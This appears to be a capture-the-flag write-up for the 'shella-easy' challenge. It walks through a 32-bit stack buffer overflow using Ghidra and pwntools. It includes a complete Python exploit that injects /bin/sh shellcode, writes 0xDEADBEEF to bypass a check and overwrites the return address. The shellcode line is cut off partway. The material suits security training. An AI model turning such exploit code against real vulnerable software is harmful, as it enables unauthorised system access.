# This is the documentation for the shella ctf challenge

## Step-by-Step Guide

This document outlines the steps taken to identify and exploit a buffer overflow vulnerability
using tools like Ghidra, virtual environment, and Python. Each step is critical to
understanding the target system, identifying the vulnerability, and creating a succesful
exploit.


### File information:

shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked,
interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped



### Security information

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      SymbolsFORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   71 Symbols       No    0               2               shella-easy                                    
                                                                                               

### 3. Identifying the Target Memory Address

**Description:**
Finding the memory address you want to return to after exploiting the buffer overflow is
critical for hijacking. In this case the memory address we want was within the sentence
displayed when the shella-easy program is run.

* **Analyze the Binary:** Using Ghidra to identify the memory address you want to redirect
execution to. Ghidra is also good for knowing how far you are from a desire address and how
much you need to pad it to reach there.

* **Record the Address:** This address will be used later in the payload to overwrite the
return address. We record multiple address in this challenge because we have to bypass certain
obstacles to get to where we wanted. For example in Ghidra we found a conditional statment that
needed the memory address of deadbeef in order for the program to not just exit.


#4. The use of padding and shellcode

**What is cyclic: **
In our explotation code we use a function called cyclic which is a built in function of the
pwntools library. This function is supposed to create a unique pattern of characters in which
we shoud be able to find after inputting it in a function. Using the other built in function
cyclic_find() in which you insert a memory address of where the unique pattern is in memory
and show the distance in which how far away you are. These two tools was helpful in indentifying
how much we needed to pad the code.
 


#5. The exploit code

```python
 from pwn import * 

 # initalizing the process
 pw = process("./shella-easy")

 # Recieve data until the > symbol
 pw.recvuntil(b'have a')

 the_memory = pw.recv(12)

 # sends data to buffer overflow while also sending the address we want
 print(the_memory)

 payload = b''
 shellcode = ""
 # This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-827.php`
 shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb>

 gdb.attach(pw, gdbscript = 'b *0x8048548')

 padding = 100

 payload += shellcode

 # This is to make sure the shellcode lines up with our deadbeef 
 payload += b'A' * (64 - len(shellcode))

 # The memory address of deadbeef needed to bypass the conditional statement
 payload += p32(0xDEADBEEF)

 # This is to line up the return address
 payload += b'B' * 8

 #payload += cyclic(padding - len(payload)) This shows where the retrun address needs to be

 # The return address where are shellcode is in memory
 payload += p32(int(the_memory,16))

 # Sends the payload
 pw.sendline(payload)

 print(pw.recvline())

 # allows us to interact with the process
 pw.interactive()



```


### Conclusion

When going through these steps you realize it is important to know what your objective is
and taking each progress step by step. In order for one block of code to execute it relies on
the execution of another block of code or condition that was cleared earlier. Knowing the
convertions of hexadecimle and binary was important and padding was critical in this challenge.
It's like a puzzle in which you need to find all your pieces in order to create a succesful 
exploitation.
 

